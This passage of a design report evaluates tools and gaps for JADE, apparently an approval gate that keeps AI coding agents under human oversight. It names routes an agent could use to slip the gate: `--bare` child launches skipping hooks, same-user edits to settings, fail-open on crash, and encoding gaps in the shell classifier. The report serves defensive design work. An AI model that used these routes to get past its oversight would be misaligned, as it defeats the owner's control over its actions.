- **JADE has.** Wilson intervals (a standard range for a rate), Brier score and ECE (two ways to score probabilities), risk-coverage, paired bootstrap and Holm (a fix for many tests at once), shadow and canary stages. [VERIFIED R5: `jade/evals.py`, `jade/improve.py`, `policies/promotion.yaml`.] It has no conformal method, no Platt scaling, no agreement score between annotators, no session-clustered intervals, no benchmark adapter. [VERIFIED R5: grep, 5 refs.]
- **Public benchmarks** (AgentDojo, AgentHarm, InjecAgent, Agent Security Bench, R-Judge, ToolEmu, Terminal-Bench 2.0, tau-bench). They hold labelled attack and benign cases and no Jev probability, so they cannot measure Jev's accuracy. [INFERENCE R5.] Most carry non-shell function calls. AgentHarm's README asks not to train on it, and JADE has a threshold-tuning loop. Decision: do not build a benchmark adapter now. Re-open only if a named JADE rule or metric needs the data. Do not use SWE-bench Verified (Epoch review: 59.4% of 138 audited tasks had flawed tests). [VERIFIED R5.]
- **Three of JADE's gates are statistically weak.** Facts: `improve.replay_verdict` (line about 193) passes a challenger only if its upper bound on false-accept rate is at most the champion's point estimate, so a same-threshold challenger can never pass. The protected stage (lines 242 to 246) compares point estimates with no interval. Canary rollback (lines 315 to 332) has no minimum sample size. [VERIFIED R5: code read on `origin/main`.] The power numbers come from a synthetic simulation with calibrated nested thresholds. [VERIFIED by script `stats2.py`, `stats3.py`; the model is synthetic.] R5's own list also names `propose_threshold` (`evals.py` lines 357 to 369), which takes the lowest passing threshold out of 46 with no fix for many tests; this section's list is the part of R5's list that matters most, not all of it. The claim "only stricter challengers can pass" rests on the fact that labels exist only for rows the champion accepted. [INFERENCE R5, Consequence 3.]
- **Library choice.** Keep own `evals.wilson`. A 30-line conformal scan is smaller than MAPIE. Skip `ppi_py` until a random audit exists. [INFERENCE R5.]
- **Fix for selective labels.** A random audit of silent allows with a stored sampling probability is the clean route. [RECOMMENDATION R5; needs approval, because it adds owner-facing questions.] Nobody publishes a fix for a single-decision-maker setting.

## 4. Closing outputs

### 4.1 Decision table

Categories. Integrate: use it as a real layer. Adopt cheaply: small change, no new runtime dependency. Spike: test first, then decide (see 4.2). Skip: do not adopt. Anything that changes safety behavior needs approval.

| Solution | Decision | One-line reason |
|---|---|---|
| Claude Code hooks, `onFailure: block` | Integrate | The native gate point; already used. |
| Claude Code sandbox | Integrate (owner step plus a `jade check` row) | Only real containment. Never lowers a JADE level by itself. Needs approval for any enforced setting. |
| Managed settings (hooks) | Spike 2, then adopt | Closes same-user tamper of wiring. Needs approval. |
| `--bare` and `--safe-mode` child launches | Spike 2, then a gate rule if needed | A possible bypass today. Needs approval. |
| Native deny floor (managed) | Adopt cheaply (needs approval) | Only for SI-style items no approval may lift; one source file; a test that lists agree. |
| Mods guard check | Adopt cheaply | Owner closes probe cell 13; add a `jade check` row. |
| Auto mode | Integrate as the baseline for ordinary risk | No offline comparison with Jev is possible. Measure Jev-decides by owner denies. |
| `defer`, PermissionRequest, settings ask rules | Spike 4 | Native pause and ask channels never probed. |
| Container isolation, git-side enforcement | Ask the owner (cheap checks) | Strong controls JADE does not need to build. |
| OpenHands, LangGraph, OpenAI Agents SDK, MAF, Temporal, DBOS, Restate, Inngest, CrewAI | Skip | Wrong layer, or license, or paid path (section 3.1). |
| OPA, Cedar, NeMo, Guardrails AI, OpenFGA, Cerbos, Invariant | Skip | Replace only the match step, or wrong layer (section 3.2). |
| LlamaFirewall | Skip (watch) | Only injection-scan candidate; heavy and mixed license. |
| MS AGT; Snyk `agent-scan` | Skip for the gate; read | Specs and a tool-description scanner are free ideas. |
| MCP core | Integrate | Already gated by name. |
| MCP annotations | Adopt cheaply (low priority) | Audit row, tighten only. |
| MCP elicitation, authorization, roots; JADE as MCP server or proxy; A2A | Skip | Hook-answerable, HTTP-only, deprecated, advisory, or no use case. |
| AGENTS.md, Agent Skills format | Optional chores | Not part of the architecture; keep only the "which file is read" check. |
| OTel GenAI, OpenInference | Do not build | No named backend; test host events first. |
| Codex or Cursor adapter | Skip until a second harness is used | Core stays host-neutral. |
| Macaroons, Biscuit | Skip | Delegation; JADE has none. |
| `tree-sitter-bash` | Spike 7 (dev only) | Differential test against `shellnorm`. |
| `bashlex`, `shfmt-py` | Skip | GPL and stale; binary dependency. |
| Public benchmarks, SWE-bench Verified | Skip | No Jev probability in them; flawed and contaminated. |
| MAPIE, netcal, `ppi_py` | Skip | A 30-line local scan is smaller; `ppi_py` needs the random audit first. |

### 4.1a The seven questions, answered for every solution

[RECOMMENDATION] Deliverable D asks seven questions for each solution: what it solves, where it overlaps JADE, what it does better, what JADE should do, its limits, how JADE differs, and what is missing in both. Section 2 answers all seven for the six Claude Code native items. This section does the same in short form for every Integrate, Adopt cheaply and Spike item (table A) and for every Skip or do-not-build item (table B). [UNRESOLVED] The owner's spec text is not in the evidence folder, so these seven labels are matched to the labels used in section 2. Confirm they are the owner's seven. Every cell restates sections 2 and 3 and keeps the tag and the source named there. A web fact is [INFERENCE, web page via summariser] unless the section says it read raw text. "n/a, because" means the question does not apply, and the reason follows.

**Table A: Integrate, Adopt cheaply, Spike**

| Solution (decision) | Solves | Overlaps JADE | Does better | JADE should do | Limits | JADE differs | Missing in both |
|---|---|---|---|---|---|---|---|
| Claude Code hooks, `onFailure: block` (Integrate) | Runs your code at 31 lifecycle points; PreToolUse can allow, deny, ask, defer or rewrite | JADE is built on it | The host owns the loop, resumes, merges settings, fires hooks in subagents [INFERENCE] | Keep using it; re-probe hook `ask` on the current host | Fail-open on crash unless `onFailure` (2.1.295+); same-user code can edit settings; project hooks run in `-p` with no trust dialog | Hooks give a hook point only: no approver identity, memory, ledger or calibration | Whether a hook `ask` reaches the owner in auto and bypass is open [UNRESOLVED] |
| Claude Code sandbox (Integrate: owner step and a `jade check` row) | An OS boundary for Bash and child processes; network through a proxy | None: JADE has no containment | Needs no command parsing; answers the base64, eval and variable gaps (T18) and secret-read and egress gaps (T22) at OS level [INFERENCE] | Document it as a layer; add a `jade check` row; measure asks before and after (spike 6); never lower a JADE level because of it (needs approval) | Some tools break (git over SSH); proxy does not inspect TLS; `excludedCommands` and `dangerouslyDisableSandbox` exist; use under `bypassPermissions` is unresolved | Complementary: the sandbox contains; JADE decides, asks and records | A sandbox plus an authenticated approver in one product |
| Managed settings for hooks (Spike 2, then adopt) | A root-owned settings file above user settings; managed hooks cannot be removed from below | JADE's tamper rows (T19, SI-09 to SI-12, HO-wiring) | A file the agent's user cannot write [INFERENCE] | Run spike 2 first; then a human-only `jade setup --managed` only if it helps (needs approval; manual file first in the roadmap); no `allowManagedHooksOnly` | Needs admin rights; one Mac is one point of failure; invalid-file behaviour unread | JADE protects wiring by its own gate and by `jade check` afterwards | Defence against pre-trust execution (only the vendor can fix it) |
| `--bare` and `--safe-mode` child launches (Spike 2, then a gate rule) | n/a, because this is a possible bypass, not a tool: `--bare` is said to skip hook discovery | The launch is rated low (R-99) | n/a, because it is a risk | Probe it; then a human-only class for the launch (LD-26; needs approval) | Whether user and managed hooks are skipped is unresolved | n/a, because there is nothing to compare | Same pre-trust gap as the row above |
| Native deny floor (Adopt cheaply, needs approval) | Static allow, ask, deny rules; deny is checked first | JADE's allow and deny matching and its parser stack | A documented parser the vendor keeps [INFERENCE] | A small managed deny floor for SI-style items only; `policies/safety.yaml` stays the single source; a test that both lists agree | No levels, no human-only class, no permit; the native parser is not exposed to hooks | JADE has levels, classes and permits | A shared tested corpus of parser-differential cases |
| Mods guard check (Adopt cheaply) | `cc-plugin-sec-default` stops a mod approving past deny rules and hooks | None: JADE has no mod | n/a, because it is a host guard | Owner closes probe cell 13; add a `jade check` row; do not write a JADE mod | Loads only with managed settings or a Team or Enterprise login; status here unknown | n/a, because JADE has no mod | n/a, because this is host-only |
| Auto mode (Integrate as the baseline for ordinary risk) | A second model reviews each action that no rule covers | Same goal as Jev deciding for the owner; some block defaults overlap human-only classes | Strips tool results; checks subagents; needs no extra key; sends no data to OpenRouter [INFERENCE] | Use as the baseline; build no second classifier; measure Jev by owner denies, not answers | Probabilistic: 17% miss on 52 real cases [INFERENCE: vendor figure via summary]; availability on this gateway unknown | Every JADE answer goes to a ledger with a shadow period; JADE adds money, release, wiring, terminal panel and mods classes | A public, calibrated measure of gate-decision correctness |
| `defer`, `PermissionRequest`, settings `ask` rules (Spike 4) | Native pause and ask channels | JADE blocks and waits for a signed permit | The host-native pause and resume [INFERENCE] | Probe before any custom wait | `defer` works only in `-p`, one call per turn, no timeout; the others were never probed | JADE's permit is signed and comes from outside the agent | A proof that a yes came from a human not steered by agent output |
| Container isolation and git-side enforcement (Ask the owner; cheap checks) | Containment of the agent; a token that can only do one thing | JADE's SI-08 text scan of pushes | A scoped token beats a regex for "never push to main"; a container holds more than the host sandbox [INFERENCE] | Ask the owner whether the agent can run in a container; add `jade check` rows for branch protection and the pre-push guard | Setup cost; container tools not researched [UNRESOLVED] | JADE decides and records; these contain | n/a, because not studied further |
| MCP core (Integrate) | A wire protocol for tools, resources and prompts | JADE gates MCP tools by name (`mcp__.*`, rules M-01 to M-05; unnamed tools fall to M-99) | n/a, because it is a protocol, not a gate | Stay hook-based; already done | A JADE MCP server would be advisory (an agent can skip it); a proxy covers MCP calls only | JADE's hook also covers Bash and Write | Nobody pins or hashes tool descriptions |
| MCP annotations (Adopt cheaply, low priority) | Hints such as `readOnlyHint` about a tool | None | n/a, because they are hints | An optional `jade check` audit row; tighten only, never lower a level | The spec says treat them as untrusted; no annotation field was seen in the hook input read | n/a, because JADE does not use them | n/a, because no gap shared |
| `tree-sitter-bash` (Spike 7, dev only) | A real syntax tree for bash | JADE's shell parser stack (about 4,100 lines) | A real grammar [INFERENCE] | One dev-only differential test against `shellnorm`; never at runtime | A tree is not meaning; it does not parse zsh; a native dependency | JADE reads meaning (aliases, git options, runner prefixes) | A tested corpus of parser differences |
| AGENTS.md and Agent Skills format (Optional chores) | Shared project instructions; a skill folder format | `jade setup` edits only the user-level CLAUDE.md; JADE's skill has a name and a description | n/a, because they are text formats | Keep one `jade check` row that says which instruction file the host reads; never use `allowed-tools` | Text is not enforcement | n/a, because they do not enforce | n/a, because no gap shared |

**Table B: Skip or do not build**

| Solution | Solves | Overlaps JADE | Does better | JADE should do | Limits | JADE differs | Missing in both |
|---|---|---|---|---|---|---|---|
| OpenHands | An agent platform with a security analyzer and confirmation | Risk rating of actions | Rates unknown actions UNKNOWN and confirms them by default [INFERENCE] | Skip; borrow two ideas (max risk over analyzers, UNKNOWN as a rating) | Only for agents on its SDK; no hard-deny at the analyzer boundary; `enterprise/` licence unresolved | JADE governs an agent it did not write | n/a, because see 4.5 |
| LangGraph | Durable agent graphs with `interrupt()` | A persisted wait (`WAITING_HUMAN`) | Resume is built in [INFERENCE] | Skip | Resume by whoever holds the `thread_id`; no approver check described; code before `interrupt()` runs again | JADE binds approver and plan hash | An approver identity check |
| Temporal | A durable workflow engine | Persisted wait and idempotent events | Mature durable execution [INFERENCE] | Skip | Needs a server and database or Cloud (Business plan from $500 a month [INFERENCE, web page via summariser]); approver identity is the integrator's job | JADE keeps the host as the loop | An approver identity check |
| DBOS | A durable library on Postgres (MIT) | Persisted wait | Durability [INFERENCE] | Skip; look again if the multi-host trigger of ADR-01 fires | Needs Postgres | The design cousin of ADR-01; JADE is single-owner | n/a, because no gap shared |
| Restate, Inngest | Durable execution services | Persisted wait | Durability [INFERENCE] | Skip | BUSL-1.1 and SSPL [INFERENCE, web page via summariser]; Inngest human-in-the-loop page not read [UNRESOLVED] | JADE governs, it does not host the loop | n/a, because not studied |
| CrewAI | A multi-agent framework | A human approval path | n/a, because the durable human path is an Enterprise feature | Skip | Paid path for the part that matters | JADE is host-side and local | n/a, because not studied |
| OpenAI Agents SDK | An agent SDK with approvals and guardrails | Approval step | n/a, because it needs its SDK | Skip | Snapshots are not authenticated; approval does not guarantee exactly-once; `always_approve` may stick across handoffs; built-in shell and apply_patch skip the guardrail pipeline; no stable library entry point for JADE [UNRESOLVED] | JADE marks an unknown outcome (SI-07) and keeps the command blocked | Exactly-once for approved side effects (OpenAI says so itself) |
| Microsoft Agent Framework | An agent framework with checkpoints | Persisted state | n/a, because it needs its framework | Skip; middleware could host a JADE gate on demand | Checkpoints use pickle with a restricted unpickler; its page calls storage a trust boundary; human-in-the-loop page not read [UNRESOLVED] | JADE records in a ledger the agent cannot write | n/a, because not studied |
| OPA (Rego) | A general policy engine | The "match" step only | A mature engine with a decision log [INFERENCE] | Skip; optionally write decisions in an OPA-log-like JSON shape | Adds a process and a crash path in the hook; drops events above `max_decisions_per_second`; latency not measured [UNRESOLVED] | JADE turns a shell string into trusted facts | No engine parses shell |
| Cedar | A policy language | The "match" step only | Policy-change analysis [INFERENCE] | Skip; look again if a rule change cannot be replay-tested in time | Allow or deny only (no level, rule id or reversibility); a policy that errors is skipped, which is a silent allow; a native wheel | JADE fails closed | No engine parses shell |
| Invariant Guardrails (Snyk) | Rules over traces of calls, through a gateway | Per-call egress (R-21) and reads (`blind`): partial [INFERENCE] | Rules across a sequence of calls [INFERENCE] | Skip; keep the idea of call-sequence rules | The README does not mention Claude Code; repo quiet since 2026-01-12 | JADE is per call and hook-based | Cross-call data-flow policy that also understands shell |
| NeMo Guardrails, Guardrails AI | Rails around LLM text | None | n/a, because wrong layer | Skip | Not for tool calls; NeMo licence disagrees (README Apache-2.0, GitHub API NOASSERTION) | JADE gates tool calls | n/a, because wrong layer |
| LlamaFirewall | An injection scan of tool results | None: JADE has no scan | The only candidate for the missing scan [INFERENCE] | Skip; watch | Needs torch, transformers and Hugging Face access; mixed licences (weights unresolved) | JADE has no injection scan | A small dependency-free injection scan |
| Microsoft Agent Governance Toolkit (AGT) | YAML policies, `govern()`, `require_approval` with named approvers | The biggest overlap | Ideas to read: outcome attestation, intent declaration [INFERENCE] | Skip for the gate; read the specs | Its own LIMITATIONS.md: no shell parsing, shares a process with the agent, default allow with no policies; coverage claim differs between README text and badge | JADE parses shell and keeps its approver outside the agent | Intent binding (OWASP ASI01) |
| Cerbos, OpenFGA | Team policy decision services | Cerbos can map a hook payload to a policy check; OpenFGA none | A team-scale policy service [INFERENCE] | Skip; Cerbos only if JADE becomes multi-user | Cerbos sends commands and content to a PDP and hub (privacy review), is pre-1.0, pricing unresolved | JADE is single-user and local | n/a, because not studied |
| Snyk `agent-scan` (was `mcp-scan`) | A tool-description scanner | None | May fill the tool-description pinning gap [INFERENCE] | Read it first; skip for the gate | R3 saw only search summaries and a GitHub redirect for the rename [UNRESOLVED] | JADE has no pinning | Tool-description integrity |
| MCP elicitation, authorization, roots | Server asks the user; OAuth for HTTP; directory hints | An `Elicitation` hook can answer without a dialog | n/a, because not a gate | Skip | Hook-answerable, so not human-only; OAuth is HTTP only; roots are deprecated | JADE's approval cannot be answered by a hook | n/a, because no gap shared |
| JADE as an MCP server or proxy | An advisory `jade_ask` tool; a proxy for MCP calls | JADE's own hook | n/a, because it is JADE itself | Skip; cheap later | Advisory only; a proxy covers MCP calls only | n/a | n/a |
| A2A | Agent-to-agent tasks and signed Agent Cards | None: no inter-agent channel | n/a, because no use case | Skip; watch; add a threat row first if the host ever receives A2A tasks | An A2A reply is untrusted data; release date and licence unresolved | n/a | n/a |
| OpenTelemetry GenAI, OpenInference | Standard telemetry for model, agent and tool calls | None: JADE has no OTel; rows carry `trace_id` and `session_id` | A standard export format [INFERENCE] | Do not build; first test whether the host's own events already join to JADE rows | All at Development stability; no known OTLP backend | JADE's ledger is its own | n/a, because no gap shared |
| Codex or Cursor adapter, other harnesses (Gemini CLI, Cline, Aider) | Hooks with the same exit-2 block signal | JADE has one adapter | n/a, because no second harness is in use | Skip until the owner uses a second harness | Codex fail-open with no switch found; Cursor `failClosed` option; Cline and Gemini facts partly secondary; Aider has no hooks | JADE is Claude Code only today | n/a, because not studied |
| Macaroons, Biscuit, OAuth RAR | Capability tokens (RAR is close to a JADE permit) | The JADE signed permit binds id, plan hash, digest, policy version, risk, principal, expiry and nonce | Delegation from an agent to a sub-agent [INFERENCE] | Skip | JADE has one owner and no delegation | JADE's permit is single-use and out of band | Delegation of narrowed rights to subagents |
| `bashlex`, `shfmt-py` | Shell parsing | JADE's parser stack | n/a, because not better | Skip | `bashlex` is GPLv3+ and stale since 2023; `shfmt-py` installs a binary | JADE reads meaning | n/a, because no gap shared |
| Public benchmarks, SWE-bench Verified | Labelled attack and benign cases | None | Labelled cases [INFERENCE] | Skip now; derive cases only for a named rule | No Jev probability in them; most use non-shell calls; AgentHarm asks not to train on it; SWE-bench Verified had flawed tests (59.4% of 138 audited tasks) | JADE needs per-call labels for its own rules | A calibrated measure of gate-decision correctness |
| MAPIE, netcal, `ppi_py` | Conformal and calibration libraries | JADE's own `evals.wilson` and Brier code | Ready-made methods [INFERENCE] | Skip; a 30-line local scan is smaller; `ppi_py` only after a random audit exists | No labels below the accept line today | JADE keeps its code small | A fix for selective labels |

### 4.2 Spikes: question, pass rule, time box, who runs it, in order

Each spike has one question, a pass or fail measure, a time box, and a stop rule. The order puts safety and measurement first.

| # | Question | Pass or fail measure | Time box | Who | Stop rule |
|---|---|---|---|---|---|
| 1 | Fix the trailing-comment gap after `sh` (not a spike; a bug) | The comment cases rate high R-22; the harmless twin does not; adversarial set updated | 1 day | Agent writes, owner approves the rule change | Stop if the fix changes other classes without a replay case |
| 2 | Do user and managed hooks run in a child `claude --bare -p` and `claude --safe-mode`? | Hook fires: yes or no, per flag, in a throwaway HOME | 1 hour | Owner runs (live host) | If hooks do not fire and managed does not help, go to the gate-rule fallback |
| 3 | What share of ledger calls match only R-99, and what are JADE asks per 100 gated calls by rule id? | Two numbers from a read-only ledger query | Half a day | Agent (read-only) | Stop at the numbers; they decide the "ask on unknown" idea |
| 4 | Does a hook `ask`, a settings `ask` rule, `PermissionRequest`, or `defer` reach the owner on the current host in auto, bypass and `-p`? | One row per cell in `evals/probes/hook_ask/` | 2 hours | Owner runs (live host) | If none works, keep the chat channel as is |
| 5 | How many owner denies exist in the shadow period? | Count of denies: 30 minimum, 100 target | Until reached (no build) | Agent reports from the ledger | Do not widen Jev-decides before the minimum |
| 6 | Does the sandbox cut JADE asks, and does it apply under `bypassPermissions`? | JADE asks per 100 gated calls by rule id, before and after, in one project; no new gap seen | 1 day | Owner turns it on | If a needed tool breaks, record it and stop |
| 7 | Does `tree-sitter-bash` find real `shellnorm` disagreements on the replay corpus? | Number and class of disagreements; at least one real bug class, or a clean result | 1 day | Agent (dev only) | Stop if the output is mostly parser noise. Do not grow the classifier because of it |

Cut from the earlier draft: the 50-call auto-mode replay (no data source, no power), the benchmark spike (no named JADE rule or metric), the OTel export (no named backend).

### 4.3 What not to build, and what to do with JADE's weak parts

Do not build: a durable workflow runtime, a JADE sandbox, a JADE MCP server or proxy, an A2A channel, an injection ML scanner, a conformal or Platt library, an OTel exporter (until an owner names a backend), a second classifier model, a Cedar or OPA hot path, a Codex or Cursor adapter (until a second harness is used), a macaroon layer. [RECOMMENDATION]

For JADE's own components that this section called weak, each with a default (removal or limits need approval):

| Component | Finding | Recommended default |
|---|---|---|
| Shell classifier (about 4,100 lines) | A cost with a live gap (section 1.1) | Freeze. Only bug fixes with a test and the measured gaps. No new rule families without a replay case. |
| Jev-decides (W-102) | Overlaps auto mode; unmeasured accuracy | Keep in shadow. Do not widen until the deny count reaches the minimum (spike 5). Removing it is an owner choice if auto mode covers the ordinary risk. |
| Owner-confirmed memory | Value unproven against native allow rules [INFERENCE R1] | Keep. Measure repeat asks avoided against the baseline of 20% repeats. |
| State machine | Commodity [INFERENCE] | Keep. Do not extend. Do not replace. |
| Promotion gates | Three statistically weak gates | Fix the canary minimum sample size and use intervals in the protected stage. Needs approval; it changes safety behavior. |

### 4.4 JADE's likely differentiators

Stated with the challenge each must survive.
1. **Approval where the host has none, by an approver an agent cannot reach.** Signed single-use permit, plan-hash binding, separate OS account, tty and ancestor checks. [VERIFIED R2, R3: docs and code read; tests not re-run.] No page read describes this in other tools (section 1.2, finding 2). The challenge: a native manual prompt is also a human click. The value appears in auto, bypass and headless modes, where 3,416 of 3,424 gated calls had no host prompt. [VERIFIED A3.] A hook-answerable channel (Elicitation, `updatedInput.answers`) is not human-only. [VERIFIED R1, R4.]
2. **Human-only classes and safety invariants no approval can lift** (money, release, wiring, mods, terminal panel; SI-xx). Auto mode's block list overlaps in part. [INFERENCE R1.]
3. **A ledger of calls and outcomes** with `OUTCOME_UNKNOWN`, and `jev verify` with abstention as an exit code. This is a design. Calibration is not measured. [VERIFIED R5.]
4. **Owner-confirmed memory with scope and lifetime.** Value unproven. [INFERENCE R1.]
5. **Not differentiators:** the shell classifier, the state machine, and Jev-decides. "Harness-neutral" is only intent today.

### 4.5 Capabilities missing everywhere

Missing in JADE and in the tools read, unless noted. [INFERENCE unless tagged.]
- A calibrated probability of decision correctness for agent gating, with an honest interval. Anthropic reports rates, not calibration. [VERIFIED R1, R5.]
- A fix for selective labels (the random audit and review of blocks, R5, are untested in practice).
- A standard for proving a yes came from a human not influenced by agent output (as far as the pages read).
- Exactly-once for approved side effects. OpenAI says so itself; JADE only marks the unknown.
- Cross-call data-flow enforcement that also understands shell; a sandbox with default-deny egress plus an authenticated approver in one product.
- Tool-description integrity (hash and pin). [VERIFIED R6 for the spec read.]
- Measurement of human attention (seeded bad calls, time to approve). Approval fatigue is documented by vendors, not measured per owner.
- A small, dependency-free scan for prompt injection in tool results.
- Approval text that is safe for bidi and Persian. On `open-items-scopes` (R6 probe2, real `policy.assess`) the chat and dialog text keeps U+202E and U+2067, while the terminal permit screen escapes them. On `origin/main` only a weaker probe ran (synthetic assessment through `question_for`); it also kept U+202E. [VERIFIED R6, ref named; probe2 not repeated on `origin/main`; Claude Code's UI not tested.] No competitor addresses it.
- Intent binding (OWASP ASI01), delegation of narrowed rights to subagents, and defense against pre-trust execution (only the vendor can fix that; R6, Check Point cases).

### 4.6 License and lock-in for what JADE will use

Claude Code is a closed product (sandbox runtime open, repo name unresolved) and is the only enforcement point: lock-in is high. MCP is open (Apache-2.0 spec, CC BY 4.0 docs): low. `tree-sitter-bash` is MIT (0.25.1, 2025-12-02). `bashlex` is GPLv3+ and stale: reject. [INFERENCE, web page via summariser; R3, R4, R1] Licenses and activity of skipped tools are in sections 3.1 and 3.2. Activity dates (GitHub `pushed_at`, accessed 2026-11-16) show life, not quality. Advisory counts for non-Claude projects were not obtained (HTTP 403). [UNRESOLVED R2.] "Security posture" for them means only what their own docs admit.

### 4.7 Limits of this research

- Most web facts are WebFetch summaries from a small model. Wording, versions and defaults could be wrong. License and activity were cross-checked through the GitHub API or PyPI where possible, also through the summariser.
- No Claude Code behavior was tested for this section. The only measured host behavior is JADE's own probe on 2.1.314; the docs describe up to v2.1.324. Open: hook `ask` reach in auto and bypass, `defer`, `--bare` and `--safe-mode`, mods guard status, sandbox under bypass.
- JADE claims come from R1 to R6 and A3, A4, A8, reading `origin/main` (e9412f3) and two unmerged refs. The reviser read `jade/proxy.py` `skip_reason` and `improve.py` directly on `origin/main` through `git show`. Tests were not re-run. Counts and line numbers drift as refs move.
- Not read: Gemini CLI policy engine, Cursor approval and sandbox, Cline hooks page, Codex managed config pages, Inngest and MAF human-in-the-loop pages, Restate SDK licenses, OpenHands `enterprise/` license, PromptGuard 2 weight license, the hooks page past 100,000 characters (R1), container isolation tools, AGT identity and named-approver features, `agent-scan`. No CVE audit, no latency measure for any engine.
- Most R5 papers were read as abstracts. Simulations are synthetic. No live ledger was read by this section, so the owner's deny rate and labelled yield are unknown. The 93% figure is about Claude Code users in general.
- Several claims rest on search snippets (Snyk's later products, Keycard-on-Cedar, Cursor CVEs, Copilot severity). They keep their secondary tag. A1 to A8 were not read in full.
